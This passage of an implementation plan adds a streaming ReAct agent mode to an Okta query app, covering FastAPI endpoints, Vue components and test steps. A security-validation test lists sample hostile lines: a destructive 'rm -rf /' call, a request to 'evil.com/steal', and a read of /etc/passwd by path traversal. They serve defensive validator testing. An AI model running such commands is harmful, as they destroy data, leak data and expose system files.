                  "error": str(e),
                  "message": "ReAct execution failed"
              })
      
      return EventSourceResponse(event_generator())
  ```

- [ ] **3.5** Implement `/cancel/{process_id}` endpoint:
  ```python
  @router.post("/cancel/{process_id}")
  async def cancel_react_process(
      process_id: str,
      current_user: AuthUser = Depends(get_current_user)
  ):
      """Cancel ReAct agent execution (same as Tako)"""
      if process_id in active_processes:
          active_processes[process_id]["cancelled"] = True
          active_processes[process_id]["status"] = ProcessStatus.CANCELLED
          logger.info(f"[{process_id}] ReAct process cancelled by user")
      return {"status": "cancelled", "process_id": process_id}
  ```

- [ ] **3.6** Register router in `src/api/main.py`:
  ```python
  # Add import
  from src.api.routers import react_stream
  
  # Register router (after realtime_hybrid)
  app.include_router(react_stream.router, prefix="/api")
  ```

- [ ] **3.7** Test router endpoints:
  ```bash
  # Start server
  python -m uvicorn src.api.main:app --reload --port 8000
  
  # Test start endpoint
  curl -X POST http://localhost:8000/api/react-agent/start-react-process \
    -H "Content-Type: application/json" \
    -d '{"query": "list all users"}' \
    -H "Cookie: your_session_cookie"
  
  # Response: {"process_id": "uuid", "plan": {"steps": []}}
  
  # Test SSE stream
  curl -N http://localhost:8000/api/react-agent/stream-react-updates/{process_id} \
    -H "Cookie: your_session_cookie"
  
  # Expected: SSE events stream (STEP-START, STEP-END, COMPLETE)
  ```

---

### **Phase 4: Frontend - Create ReAct Components** (2 hours)

#### **File: `src/frontend/src/composables/useReactStream.js` [NEW]**

- [ ] **4.1** Create simplified composable (~300 lines vs 1300 for Tako):
  ```javascript
  /**
   * Composable for ReAct Agent SSE streaming
   * Simpler than useRealtimeStream - ReAct has linear discovery flow
   */
  import { ref, reactive, toRefs } from 'vue'
  import { useAuth } from '@/composables/useAuth'
  
  export function useReactStream() {
      const auth = useAuth()
      
      // Connection state
      const isLoading = ref(false)
      const isProcessing = ref(false)
      const error = ref(null)
      const activeEventSource = ref(null)
      const processId = ref(null)
      
      // Execution state (simpler than Tako)
      const execution = reactive({
          status: "idle",  // idle, discovering, validating, executing, completed
          currentStep: null,  // Current step text
          currentReasoning: null,  // Current reasoning
          discoverySteps: [],  // [{step, reasoning, timestamp}]
          results: null,  // Final results for DataDisplay
          tokenUsage: null
      })
      
      // Start process
      const startProcess = async (query) => {
          if (!query?.trim()) return null
          
          isLoading.value = true
          isProcessing.value = true
          execution.status = "discovering"
          execution.discoverySteps = []
          
          const response = await fetch("/api/react-agent/start-react-process", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              credentials: "include",
              body: JSON.stringify({ query: query.trim() })
          })
          
          const data = await response.json()
          processId.value = data.process_id
          return data.process_id
      }
      
      // Connect to SSE stream
      const connectToStream = async (id) => {
          const eventSource = new EventSource(
              `/api/react-agent/stream-react-updates/${id}`,
              { withCredentials: true }
          )
          activeEventSource.value = eventSource
          
          eventSource.onmessage = (event) => {
              const data = JSON.parse(event.data)
              handleReactEvent(data)
          }
          
          return eventSource
      }
      
      // Handle SSE events (same format as Tako)
      const handleReactEvent = (data) => {
          const eventType = data.type
          const content = data.content
          
          switch (eventType) {
              case "STEP-START":
                  handleStepStart(content)
                  break
              case "STEP-END":
                  handleStepEnd(content)
                  break
              case "STEP-PROGRESS":
                  handleStepProgress(content)
                  break
              case "STEP-TOKENS":
                  execution.tokenUsage = {
                      inputTokens: content.input_tokens,
                      outputTokens: content.output_tokens,
                      totalTokens: content.input_tokens + content.output_tokens
                  }
                  break
              case "COMPLETE":
                  handleComplete(content)
                  break
              case "ERROR":
                  error.value = content.error || content.message
                  execution.status = "error"
                  isProcessing.value = false
                  break
          }
      }
      
      const handleStepStart = (content) => {
          if (content.step_type === "react_discovery") {
              execution.currentStep = content.step_name
              execution.currentReasoning = content.query_context
              execution.discoverySteps.push({
                  step: content.step_name,
                  reasoning: content.query_context,
                  timestamp: content.formatted_time
              })
          } else if (content.step_type === "security_validation") {
              execution.status = "validating"
              execution.currentStep = "Validating security..."
          } else if (content.step_type === "script_execution") {
              execution.status = "executing"
              execution.currentStep = "Executing production script..."
          }
      }
      
      const handleStepProgress = (content) => {
          // Subprocess progress updates
          if (content.message) {
              execution.currentStep = content.message
          }
      }
      
      const handleComplete = (content) => {
          // Format results for DataDisplay.vue
          execution.results = {
              content: content.data || [],
              display_type: content.display_type || "table",
              metadata: {
                  headers: content.headers || [],
                  total: content.record_count || 0,
                  data_source_type: "realtime"
              }
          }
          
          execution.status = "completed"
          isProcessing.value = false
          
          if (activeEventSource.value) {
              activeEventSource.value.close()
              activeEventSource.value = null
          }
      }
      
      return {
          isLoading,
          isProcessing,
          error,
          processId,
          ...toRefs(execution),
          startProcess,
          connectToStream,
          cancelProcess: async () => {
              if (processId.value) {
                  await fetch(`/api/react-agent/cancel/${processId.value}`, {
                      method: "POST",
                      credentials: "include"
                  })
              }
          }
      }
  }
  ```

- [ ] **4.2** Test composable in browser console:
  ```javascript
  const { startProcess, connectToStream } = useReactStream()
  const pid = await startProcess("list all users")
  await connectToStream(pid)
  // Verify console logs show events
  ```

---

#### **File: `src/frontend/src/components/messages/ReActThinkingSteps.vue` [NEW]**

- [ ] **4.3** Create timeline component (~150 lines):
  ```vue
  <template>
      <v-card class="react-thinking-steps mb-4" elevation="2">
          <v-card-title class="d-flex align-center">
              <v-icon color="primary" class="mr-2">mdi-brain</v-icon>
              <span>Discovery Process</span>
              <v-spacer />
              <v-chip v-if="isRunning" color="primary" size="small">
                  <v-progress-circular indeterminate size="16" width="2" class="mr-2" />
                  Running
              </v-chip>
              <v-chip v-else color="success" size="small">
                  <v-icon size="16" class="mr-1">mdi-check</v-icon>
                  Complete
              </v-chip>
          </v-card-title>
          
          <v-card-text>
              <v-timeline density="compact" side="end">
                  <v-timeline-item
                      v-for="(step, idx) in steps"
                      :key="idx"
                      :dot-color="getStepColor(step)"
                      size="small"
                  >
                      <template v-slot:icon>
                          <v-icon size="16">{{ getStepIcon(step) }}</v-icon>
                      </template>
                      
                      <div class="step-content">
                          <!-- Step Header -->
                          <div class="d-flex align-center mb-2">
                              <strong>{{ step.title }}</strong>
                              <v-spacer />
                              <v-chip v-if="step.tokens" size="x-small" variant="outlined">
                                  {{ step.tokens }} tokens
                              </v-chip>
                          </div>
                          
                          <!-- Step Text (with typewriter effect if running) -->
                          <div class="step-text">
                              <span v-if="step.status === 'running'" class="typewriter">
                                  {{ step.displayText }}
                                  <span class="cursor">|</span>
                              </span>
                              <span v-else>{{ step.text }}</span>
                          </div>
                          
                          <!-- Progress bar for step (if available) -->
                          <v-progress-linear
                              v-if="step.progress && step.progress.total > 0"
                              :model-value="(step.progress.current / step.progress.total) * 100"
                              color="primary"
                              height="4"
                              class="mt-2"
                          />
                      </div>
                  </v-timeline-item>
              </v-timeline>
          </v-card-text>
      </v-card>
  </template>
  
  <script setup>
  import { ref, watch } from 'vue'
  
  const props = defineProps({
      steps: {
          type: Array,
          required: true,
          default: () => []
      },
      isRunning: {
          type: Boolean,
          default: false
      }
  })
  
  const getStepColor = (step) => {
      if (step.status === 'running') return 'primary'
      if (step.status === 'completed') return 'success'
      if (step.status === 'error') return 'error'
      return 'grey'
  }
  
  const getStepIcon = (step) => {
      if (step.status === 'running') return 'mdi-loading'
      if (step.status === 'completed') return 'mdi-check'
      if (step.status === 'error') return 'mdi-alert'
      return 'mdi-circle-small'
  }
  
  // Typewriter effect for active step
  watch(() => props.steps, (newSteps) => {
      const activeStep = newSteps.find(s => s.status === 'running')
      if (activeStep && activeStep.text && !activeStep.displayText) {
          animateText(activeStep)
      }
  }, { deep: true })
  
  const animateText = (step) => {
      let index = 0
      const text = step.text
      step.displayText = ''
      
      const interval = setInterval(() => {
          if (index < text.length) {
              step.displayText += text[index]
              index++
          } else {
              clearInterval(interval)
          }
      }, 20) // 20ms per character
  }
  </script>
  
  <style scoped>
  .react-thinking-steps {
      max-width: 100%;
  }
  
  .step-content {
      padding: 8px 0;
  }
  
  .step-text {
      color: rgba(0, 0, 0, 0.7);
      font-size: 14px;
      line-height: 1.5;
  }
  
  .typewriter {
      display: inline;
  }
  
  .cursor {
      animation: blink 1s infinite;
      font-weight: bold;
  }
  
  @keyframes blink {
      0%, 50% { opacity: 1; }
      51%, 100% { opacity: 0; }
  }
  </style>
  ```

---

#### **File: `src/frontend/src/components/ChatInterfaceV2.vue` [MODIFY]**

- [ ] **4.4** Add mode detection and ReActThinkingSteps component (~30 lines):
  ```vue
  <!-- Add to <script setup> at top -->
  <script setup>
  import ReActThinkingSteps from '@/components/messages/ReActThinkingSteps.vue'
  import { useReactStream } from '@/composables/useReactStream'
  
  // Existing imports and state...
  
  // Add ReAct mode detection (could be from query param, localStorage, or App.vue)
  const isReActMode = ref(false) // Set based on ?mode=react or user preference
  
  // Add ReAct stream composable
  const {
      isLoading: reactLoading,
      currentStep: reactCurrentStep,
      discoverySteps: reactSteps,
      results: reactResults,
      startProcess: startReActProcess,
      connectToStream: connectReActStream,
      cancelProcess: cancelReAct
  } = useReactStream()
  
  // Modify submitQuery to detect mode
  const submitQuery = async () => {
      const query = userInput.value.trim()
      if (!query) return
      
      userInput.value = ''
      hasResults.value = true
      
      if (isReActMode.value) {
          // Use ReAct flow
          const pid = await startReActProcess(query)
          if (pid) await connectReActStream(pid)
      } else {
          // Use existing Tako flow
          await executeQuery(query)
      }
  }
  </script>
  
  <!-- Add to template after question header, before DataDisplay -->
  <template>
      <!-- ... existing search bar, suggestions, question header ... -->
      
      <!-- NEW: ReAct Thinking Steps (only show in ReAct mode) -->
      <ReActThinkingSteps 
          v-if="isReActMode && reactSteps.length > 0"
          :steps="reactSteps"
          :isRunning="reactLoading"
          class="mb-4"
      />
      
      <!-- Existing DataDisplay (works for both Tako and ReAct) -->
      <DataDisplay
          v-if="hasResults && (execution.results || reactResults)"
          :type="isReActMode ? reactResults?.display_type : execution.results?.display_type"
          :content="isReActMode ? reactResults?.content : execution.results?.content"
          :metadata="isReActMode ? reactResults?.metadata : execution.results?.metadata"
      />
      
      <!-- ... rest of existing template ... -->
  </template>
  ```

- [ ] **4.5** Test modified ChatInterfaceV2:
  ```bash
  cd src/frontend
  npm run dev
  # Test Tako mode (default): Verify existing functionality works
  # Test ReAct mode (?mode=react): Verify thinking steps show + DataDisplay works
  ```

---

### **Phase 5: End-to-End Testing** (1 hour)

- [ ] **5.1** Test complete workflow:
  ```
  User Query → Discovery (7 steps, ~60s) → Synthesis (code gen) →
  Validation (security, ~1s) → Execution (subprocess, ~20s) → Results (table)
  ```

- [ ] **5.2** Test security validation:
  ```python
  # Manually inject malicious code to verify detection:
  
  # Test 1: Blocked import
  import os; os.system("rm -rf /")  # Should fail validation
  
  # Test 2: External URL
  requests.get("http://evil.com/steal")  # Should fail validation
  
  # Test 3: File path traversal
  open("../../../etc/passwd", "r")  # Should fail validation
  ```

- [ ] **5.3** Test cancellation:
  ```javascript
  // Test cancellation during different phases:
  
  // During discovery (step 3/7)
  await cancelProcess()  // Should stop immediately
  
  // During execution (subprocess running)
  await cancelProcess()  // Should terminate subprocess
  ```

- [ ] **5.4** Test error handling:
  ```
  Test Cases:
  1. Invalid query: "xyzabc123" → Should show error message
  2. Network failure: Disconnect internet → Should handle gracefully
  3. Timeout: Query taking >3 minutes → Should timeout and report
  4. Rate limit: Hit API limit → Should show rate limit message
  5. Invalid API credentials: Remove .env → Should show auth error
  ```

- [ ] **5.5** Test DataDisplay integration:
  ```
  Test Scenarios:
  1. Table results (users):
     - Verify headers display correctly
     - Verify data populates rows
     - Verify streaming progress bar shows during execution
     - Verify CSV download works
  
  2. Markdown results (summary):
     - Verify markdown renders with formatting
     - Verify code blocks display correctly
  
  3. JSON results (raw data):
     - Verify JSON pretty-prints
     - Verify large JSON doesn't crash browser
  
  4. Error messages:
     - Verify error alert displays with red styling
     - Verify error details are readable
  ```

- [ ] **5.6** Performance testing:
  ```
  Metrics to collect:
  - Discovery phase duration: ~60-90s (acceptable)
  - Validation duration: <1s (fast)
  - Execution duration: ~20-40s (depends on query)
  - Total token usage: ~200K input + 5K output (acceptable)
  - Memory usage: <500MB (acceptable)
  ```

---

### **Phase 6: Production Readiness** (30 minutes)

- [ ] **6.1** Add comprehensive logging:
  ```python
  # In one_react_agent_executor.py
  logger.info(f"[{correlation_id}] ReAct discovery started")
  logger.info(f"[{correlation_id}] Discovery completed: {step_count} steps, {duration}s")
  logger.info(f"[{correlation_id}] Security validation: {validation_result['status']}")
  logger.info(f"[{correlation_id}] Subprocess execution: {execution_time}s, {record_count} records")
  logger.info(f"[{correlation_id}] Total tokens: {input_tokens + output_tokens}")
  ```

- [ ] **6.2** Add metrics collection:
  ```python
  # Create metrics dictionary for monitoring
  execution_metrics = {
      "query": query,
      "discovery_duration_seconds": discovery_time,
      "validation_duration_seconds": validation_time,
      "execution_duration_seconds": execution_time,
      "total_duration_seconds": total_time,
      "input_tokens": input_tokens,
      "output_tokens": output_tokens,
      "total_tokens": input_tokens + output_tokens,
      "record_count": len(results),
      "step_count": step_count,
      "status": "success" or "failed",
      "error": error_message if failed else None
  }
  
  # Log metrics as JSON for easy parsing
  logger.info(f"[{correlation_id}] METRICS: {json.dumps(execution_metrics)}")
  ```

- [ ] **6.3** Document API endpoints:
  ```markdown
  # ReAct Agent API Endpoints
  
  ## POST /api/react-agent/start-react-process
  Start ReAct discovery process
  
  **Request:**
  ```json
  {
    "query": "list all users with MFA"
  }
  ```
  
  **Response:**
  ```json
  {
    "process_id": "uuid",
    "plan": {"steps": []}
  }
  ```
  
  ## GET /api/react-agent/stream-react-updates/{process_id}
  Stream execution updates via SSE
  
  **Events:**
  - STEP-START: Discovery step begins
  - STEP-END: Discovery step completes
  - STEP-PROGRESS: Subprocess progress update
  - STEP-TOKENS: Token usage
  - COMPLETE: Final results
  - ERROR: Execution error
  
  ## POST /api/react-agent/cancel/{process_id}
  Cancel running process
  
  **Response:**
  ```json
  {
    "status": "cancelled",
    "process_id": "uuid"
  }
  ```
  ```

- [ ] **6.4** Update user documentation:
  ```markdown
  # ReAct Discovery Mode
  
  ## What is ReAct Mode?
  ReAct (Reasoning + Acting) mode provides transparent API discovery where you can see
  the agent's step-by-step reasoning process as it learns about your Okta environment.
  
  ## When to Use ReAct
  - You need API-only data (no SQL database)
  - You want to see the discovery process (transparency)
  - You're exploring novel query patterns
  - You need to verify the agent's reasoning
  
  ## Features
  - **Discovery Steps**: See each reasoning step as the agent learns
  - **Security Validation**: Automatic code scanning before execution
  - **Real-time Progress**: Live updates during API execution
  - **Token Transparency**: See exact token usage
  
  ## Comparison: Tako vs ReAct
  
  | Feature | Tako Multi-Agent | ReAct Discovery |
  |---------|------------------|-----------------|
  | Speed | Fast (~30s) | Slower (~90s) |
  | Cost | Lower (~$0.15) | Higher (~$0.41) |
  | Transparency | Plan only | Full reasoning |
  | Data Source | SQL + API | API only |
  | Best For | Common queries | Novel patterns |
  ```

---

## Testing Checklist Summary

**Phase 1: Backend Callbacks** ✅
- [ ] ReAct agent emits STEP-START events with thinking text
- [ ] Probe results stay in agent context (not sent to frontend)
- [ ] Console output shows "🎯 STARTING" and "💭 Reasoning"

**Phase 2: Execution Wrapper** ✅
- [ ] Security validation catches malicious imports
- [ ] Security validation catches external URLs
- [ ] Subprocess execution streams `__PROGRESS__` events
- [ ] Temporary files cleaned up after execution

**Phase 3: React Router** ✅
- [ ] `/start-react-process` returns process_id
- [ ] `/stream-react-updates` streams SSE events
- [ ] `/cancel` stops execution gracefully
- [ ] Events match Tako format (STEP-START, STEP-END, COMPLETE)

**Phase 4: Frontend Components** ✅
- [ ] useReactStream.js connects to SSE
- [ ] ReActThinkingSteps.vue displays discovery steps with timeline
- [ ] ChatInterfaceV2.vue modified to show ReActThinkingSteps in ReAct mode
- [ ] ChatInterfaceV2.vue still works correctly in Tako mode (no regressions)
- [ ] DataDisplay.vue renders results in both modes (table/markdown/JSON)
- [ ] Mode detection works (query param, localStorage, or user preference)

**Phase 5: End-to-End** ✅
- [ ] Full workflow: Discovery → Validation → Execution → Results
- [ ] Error handling works for all phases
- [ ] Cancellation stops execution at any phase
- [ ] Token usage tracked and displayed
- [ ] Performance acceptable (~90s total)

---

## Design Decisions & Notes

### **Why Modify ChatInterfaceV2 Instead of Creating New Component?**
- **Code reuse:** Keeps search bar, suggestions, DataDisplay functionality
- **Consistency:** Both Tako and ReAct use same UI (no jarring mode switch)
- **Minimal changes:** Only ~30 lines added (mode detection + one component)
- **Maintainability:** Single component to maintain, not two similar ones

### **Why Separate Router (react_stream.py)?**
- **Clean separation:** ReAct has different workflow than Tako multi-agent
- **Easier debugging:** Isolated codebase for ReAct-specific logic
- **No risk:** Won't break existing Tako functionality
- **Future flexibility:** Can optimize ReAct independently

### **Why Match realtime_hybrid.py Event Format?**
- **No frontend changes:** Reuse existing SSE handlers (with slight simplification)
- **Proven architecture:** Same event types already working in Tako
- **User experience consistency:** Both modes look/feel the same in UI
- **Faster development:** Don't reinvent the wheel

### **Why Stream Thinking Text Only (Not Probe Data)?**
- **Performance:** Sending 3 sample records × 7 steps = 21 events (unnecessary)
- **Security:** Don't expose internal API structure to frontend logs
- **User focus:** Users care about "what's happening", not "what data returned"
- **Agent learning:** Probe results needed by agent, not by users

### **Why Subprocess for Execution?**
- **Isolation:** Generated code runs in separate process (safety)
- **Proven pattern:** Already working in Tako for API execution
- **Progress streaming:** `__PROGRESS__` events via stderr (established)
- **Timeout protection:** Kill process after 3 minutes (safety)

### **Why Security Validation Before Execution?**
- **Safety first:** Never run untrusted generated code
- **Reuse existing:** `validate_generated_code()` already checks imports/endpoints/paths
- **Fast check:** Validation takes <100ms, worth the safety
- **User trust:** Show "Validating security..." step for transparency

### **Key Technical Notes**
- **Probe data isolation:** UI doesn't need 3 sample records × 7 steps (performance)
- **Security validation:** Reuses Tako's `validate_generated_code()` (no new code)
- **Subprocess pattern:** Identical to Tako's `_execute_subprocess_with_streaming()` (proven)
- **SSE event types:** Same as Tako (no frontend changes needed)
- **Error handling:** Three failure points: discovery, validation, execution (all handled)
- **Cancellation:** Aggressive termination via `cancelled_queries` set (minimal)
- **DataDisplay.vue reuse:** NO changes needed - already supports streaming tables!

---

## Final Summary

### **Files to Create (5 new files)**

**Backend (2 files):**
1. `src/api/routers/react_stream.py` - ReAct SSE router (~500 lines)
2. `src/core/agents/one_react_agent_executor.py` - Execution wrapper (~300 lines)

**Frontend (2 files):**
3. `src/frontend/src/composables/useReactStream.js` - SSE handler (~300 lines)
4. `src/frontend/src/components/messages/ReActThinkingSteps.vue` - Timeline component (~150 lines)

**Testing (1 file):**
5. `scripts/test_react_executor.py` - Standalone testing (~100 lines)

### **Files to Modify (3 files)**

**Backend (2 files):**
1. `src/core/agents/one_react_agent.py` - Add 3 SSE callback fields + emit events (~50 lines added)
   - Note: `progress_callback` already exists at line 542, adding 3 new callbacks
2. `src/api/main.py` - Register react_stream router (~3 lines added)

**Frontend (1 file):**
3. `src/frontend/src/components/ChatInterfaceV2.vue` - Add mode detection + ReActThinkingSteps component (~30 lines added)
   - **Keep all existing UI** - search bar, suggestions, DataDisplay stay the same!
   - Just insert one new component for thinking steps + mode detection logic

### **Files to Reference (4 files - NO changes)**

1. `src/api/routers/realtime_hybrid.py` - Copy SSE pattern, event types, ProcessStatus
2. `src/core/orchestration/modern_execution_manager.py` - Copy subprocess streaming pattern (line 3352+)
3. `src/frontend/src/composables/useRealtimeStream.js` - Reference event handling pattern
4. `src/frontend/src/components/messages/DataDisplay.vue` - **NO CHANGES NEEDED!** Already reusable ✅

---

### **Implementation Effort Breakdown**

| Phase | Duration | Files | Description |
|-------|----------|-------|-------------|
| **Phase 1** | 1.5 hours | 1 file | Add SSE callbacks to ReAct agent |
| **Phase 2** | 2 hours | 1 file | Create execution wrapper with security |
| **Phase 3** | 1.5 hours | 2 files | Create router + register in main.py |
| **Phase 4** | 1.5 hours | 3 files | Create composable, component, modify ChatUI |
| **Phase 5** | 1 hour | - | End-to-end testing |
| **Phase 6** | 30 min | - | Production readiness (logging, docs) |
| **TOTAL** | **8 hours** | **8 files** | Complete ReAct SSE integration |

---

### **Key Success Criteria**

✅ **User sees discovery thinking steps in real-time** (collapsible timeline with typewriter effect)  
✅ **Probe data stays hidden** (agent-only context, not sent to frontend)  
✅ **Security validation prevents malicious code** (imports, URLs, paths checked)  
✅ **Subprocess progress streams to UI** (`__PROGRESS__` events from stderr)  
✅ **DataDisplay.vue works without changes** (same props as Tako)  
✅ **Minimal changes to ChatInterfaceV2** (just add one component)  
✅ **No risk to existing Tako functionality** (separate router)  
✅ **Complete audit trail** (all events logged with correlation_id)  
✅ **Professional UX** (auto-expand during discovery, auto-collapse when done)

---

### **Architecture Highlights**

**Reuse Existing UI:**
- ✅ Keep ChatInterfaceV2.vue search bar, suggestions, mode selector
- ✅ Keep DataDisplay.vue for results (table/markdown/JSON)
- ✅ Only add ReActThinkingSteps.vue component for discovery steps
- ✅ No separate component - just modify ChatInterfaceV2 and add ReActThinkingSteps!

**Component Insertion Point:**
```vue
<ChatInterfaceV2>
  <SearchBar />               <!-- Existing -->
  <QuestionHeader />          <!-- Existing -->
  <ReActThinkingSteps />      <!-- NEW - only shows in ReAct mode! -->
  <DataDisplay />             <!-- Existing - works for both modes -->
</ChatInterfaceV2>
```

**Visual Flow:**
```
User enters query
    ↓
[Search bar stays at top - SAME AS TAKO]
    ↓
[Question header shows query - SAME AS TAKO]
    ↓
[ReActThinkingSteps timeline appears - NEW for ReAct mode only!]
  ● Step 1: Load endpoints (completed, 2.3s)
      "Loading API catalog..."
  ● Step 2: Filter ops (running...)
      "Filtering for user mgmt..."
  ○ Step 3: (waiting...)
    ↓
[Timeline auto-collapses when done]
    ↓
[DataDisplay shows results - SAME AS TAKO]
```

---

### **Next Steps**

1. **Review this document** - Ensure all requirements captured
2. **Start Phase 1** - Add callbacks to ReAct agent (easiest to test)
3. **Test incrementally** - Verify each phase before moving to next
4. **Keep ChatInterfaceV2 UI** - Only add thinking steps component
5. **Deploy to staging** - Test full workflow before production

---

**Document Version:** 1.1 - Simplified Frontend Approach  
**Last Updated:** November 14, 2025  
**Key Change:** Reuse ChatInterfaceV2.vue UI, only add ReActThinkingSteps.vue component  
**Status:** Ready for Implementation ✅
